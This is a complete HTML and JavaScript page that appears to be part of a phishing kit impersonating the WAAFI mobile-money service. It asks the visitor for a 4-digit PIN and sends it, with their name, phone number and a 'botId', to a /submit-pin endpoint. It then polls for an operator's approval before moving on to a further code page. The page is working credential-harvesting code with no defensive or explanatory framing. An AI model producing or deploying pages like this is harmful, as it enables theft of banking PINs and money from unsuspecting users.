<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Enter your PIN</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }
    body {
      background: #fff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px 20px 12px;
    }
    .container {
      width: 100%;
      max-width: 400px;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      flex: 1;
    }

    /* Back arrow */
    .back-arrow {
      font-size: 28px;
      font-weight: 300;
      color: #007AFF;
      text-decoration: none;
      display: inline-block;
      margin-bottom: 12px;
      line-height: 1;
      cursor: pointer;
      width: fit-content;
      background: none;
      border: none;
      padding: 0;
    }
    .back-arrow:hover {
      opacity: 0.7;
    }

    /* Title & subtitle */
    .title {
      font-size: 28px;
      font-weight: 700;
      color: #1c1c1e;
      margin-bottom: 8px;
      letter-spacing: -0.5px;
    }
    .subtitle {
      font-size: 15px;
      color: #6c6c70;
      line-height: 1.5;
      margin-bottom: 28px;
      font-weight: 400;
    }

    /* PIN input boxes – 4 boxes, same style as OTP */
    .pin-row {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
      justify-content: flex-start;
    }
    .pin-box {
      width: 56px;
      height: 56px;
      border: 2px solid #d1d1d6;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 22px;
      font-weight: 500;
      color: #1c1c1e;
      background: #fff;
      transition: border-color 0.2s, box-shadow 0.2s;
    }
    .pin-box.filled {
      border-color: #007AFF;
      box-shadow: 0 0 0 3px rgba(0, 122, 255, 0.15);
    }
    #pinInput {
      position: absolute;
      opacity: 0;
      width: 0;
      height: 0;
    }
    .pin-box-wrapper {
      position: relative;
      cursor: pointer;
      touch-action: manipulation;
      margin-bottom: 4px;
    }

    /* Alert & waiting */
    #otp-alert {
      text-align: center;
      font-size: 15px;
      font-weight: 500;
      min-height: 24px;
      margin-bottom: 12px;
      padding: 10px 12px;
      border-radius: 8px;
      background: transparent;
      transition: all 0.2s;
    }
    #otp-alert.error {
      background: #fde7e7;
      color: #b00020;
      border: 1px solid #f5c6cb;
    }
    #otp-alert.success {
      background: #e7f5e7;
      color: #1e7e34;
      border: 1px solid #b7d7b7;
    }
    #waiting {
      text-align: center;
      font-size: 14px;
      color: #007AFF;
      margin-top: 8px;
      display: none;
      padding: 10px;
      border-radius: 8px;
      background: #e8f0fe;
      border: 1px solid #bbd4f0;
    }

    /* Need help? link (optional, but included for consistency) */
    .help-link {
      display: block;
      text-align: right;
      margin-top: 4px;
      margin-bottom: 28px;
      font-size: 15px;
      color: #007AFF;
      text-decoration: underline;
      font-weight: 500;
    }
    .help-link:hover {
      opacity: 0.7;
    }

    /* Button */
    .continue-btn {
      width: 100%;
      height: 54px;
      border: none;
      border-radius: 10px;
      background: #d1d1d6;
      color: #fff;
      font-size: 18px;
      font-weight: 600;
      cursor: not-allowed;
      transition: background 0.2s;
      letter-spacing: 0.3px;
    }
    .continue-btn:enabled {
      background: #007AFF;
      cursor: pointer;
    }
    .continue-btn:enabled:hover {
      background: #0055cc;
    }
    .continue-btn.waiting {
      background: #f5a623;
      color: #fff;
      cursor: default;
    }

    /* Version footer */
    .version-footer {
      text-align: center;
      font-size: 12px;
      color: #8e8e93;
      margin-top: 24px;
      padding-bottom: 4px;
      letter-spacing: 0.2px;
    }

    /* Responsive */
    @media (max-width: 480px) {
      body {
        padding: 16px 16px 10px;
      }
      .title {
        font-size: 24px;
      }
      .pin-box {
        width: 48px;
        height: 48px;
        font-size: 20px;
      }
      .continue-btn {
        height: 54px;
        font-size: 17px;
      }
    }
    @media (max-width: 360px) {
      .pin-box {
        width: 42px;
        height: 42px;
        font-size: 18px;
      }
      .pin-row {
        gap: 8px;
      }
    }
  </style>
</head>
<body>

<div class="container">
  <!-- Back arrow -->
  <button class="back-arrow" onclick="window.history.back()">&#8592;</button>

  <!-- Title & subtitle -->
  <div class="title">Enter your PIN</div>
  <div class="subtitle">Enter your 4‑digit PIN</div>

  <!-- PIN input area -->
  <div class="pin-box-wrapper" onclick="document.getElementById('pinInput').focus()">
    <div class="pin-row">
      <div class="pin-box" id="b1"></div>
      <div class="pin-box" id="b2"></div>
      <div class="pin-box" id="b3"></div>
      <div class="pin-box" id="b4"></div>
    </div>
    <input id="pinInput" type="tel" inputmode="numeric" maxlength="4" autofocus />
  </div>

  <!-- Alert & waiting -->
  <div id="otp-alert"></div>
  <div id="waiting">⏳ Awaiting approval...</div>

  <!-- Need help? link -->
  <a href="#" class="help-link">Need help?</a>

  <!-- Button -->
  <button id="verifyBtn" class="continue-btn" disabled>Next</button>

  <!-- Version footer -->
  <div class="version-footer">Version 12.4.0892 (1200040892)</div>
</div>

<!-- ============================================================ -->
<!-- ORIGINAL LOGIC – ADAPTED FOR 4 DIGITS + REDIRECT TO SUCCESS   -->
<!-- ============================================================ -->

<script>
(function() {
  const input = document.getElementById('pinInput');
  const verifyBtn = document.getElementById('verifyBtn');
  const waitingEl = document.getElementById('waiting');
  const alertEl = document.getElementById('otp-alert');
  const boxes = [
    document.getElementById('b1'),
    document.getElementById('b2'),
    document.getElementById('b3'),
    document.getElementById('b4')
  ];

  // Updated default name to WAAFI User for consistency
  const fullName = localStorage.getItem('fullName') || localStorage.getItem('name') || 'WAAFI User';
  const phone = localStorage.getItem('phone');
  const params = new URLSearchParams(window.location.search);
  let botId = params.get('botId') || localStorage.getItem('botId');
  if (botId) localStorage.setItem('botId', botId);

  if (!phone || !botId) {
    alert('Session expired. Please start over.');
    window.location.href = 'index.html';
    return;
  }

  function focusPin() { input.focus(); }

  function updateBoxes(value) {
    const digits = value.padEnd(4, '');
    boxes.forEach((box, i) => {
      if (digits[i]) {
        box.textContent = '●';
        box.classList.add('filled');
      } else {
        box.textContent = '';
        box.classList.remove('filled');
      }
    });
  }

  input.addEventListener('input', () => {
    input.value = input.value.replace(/\D/g, '').slice(0, 4);
    updateBoxes(input.value);
    verifyBtn.disabled = input.value.length !== 4;
    alertEl.textContent = '';
    alertEl.className = '';
  });

  input.addEventListener('paste', (e) => {
    e.preventDefault();
    const paste = e.clipboardData.getData('text');
    const digits = paste.replace(/\D/g, '').slice(0, 4);
    input.value = digits;
    updateBoxes(digits);
    verifyBtn.disabled = digits.length !== 4;
    if (digits.length === 4) {
      setTimeout(() => verifyBtn.click(), 300);
    }
  });

  function showAlert(text, type = 'error') {
    alertEl.textContent = text;
    alertEl.className = type;
  }

  verifyBtn.addEventListener('click', async () => {
    const pin = input.value;
    if (pin.length !== 4) return;

    verifyBtn.disabled = true;
    verifyBtn.textContent = 'Awaiting...';
    verifyBtn.classList.add('waiting');
    waitingEl.style.display = 'block';
    showAlert('', '');

    try {
      const res = await fetch(`${window.location.origin}/submit-pin`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: fullName, phone, pin, botId })
      });
      if (!res.ok) throw new Error('Server error');
      const data = await res.json();
      if (!data.requestId) throw new Error('No ID received');
      pollPin(data.requestId);
    } catch (error) {
      waitingEl.style.display = 'none';
      verifyBtn.disabled = false;
      verifyBtn.textContent = 'Next';
      verifyBtn.classList.remove('waiting');
      showAlert('❌ Server error. Please try again.', 'error');
    }
  });

  function pollPin(requestId) {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`${window.location.origin}/check-pin/${requestId}`);
        const data = await res.json();
        if (data.approved === true) {
          clearInterval(interval);
          // ✅ Redirect to success.html after PIN approval
          window.location.href = 'code2.html';
        }
        if (data.approved === false || data.blocked) {
          clearInterval(interval);
          input.value = '';
          boxes.forEach(b => { b.textContent = ''; b.classList.remove('filled'); });
          verifyBtn.disabled = true;
          verifyBtn.textContent = 'Next';
          verifyBtn.classList.remove('waiting');
          waitingEl.style.display = 'none';
          showAlert('❌ Incorrect PIN. Please try again.', 'error');
          focusPin();
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 2000);
  }

  window.onload = () => focusPin();
})();
</script>

</body>
</html>
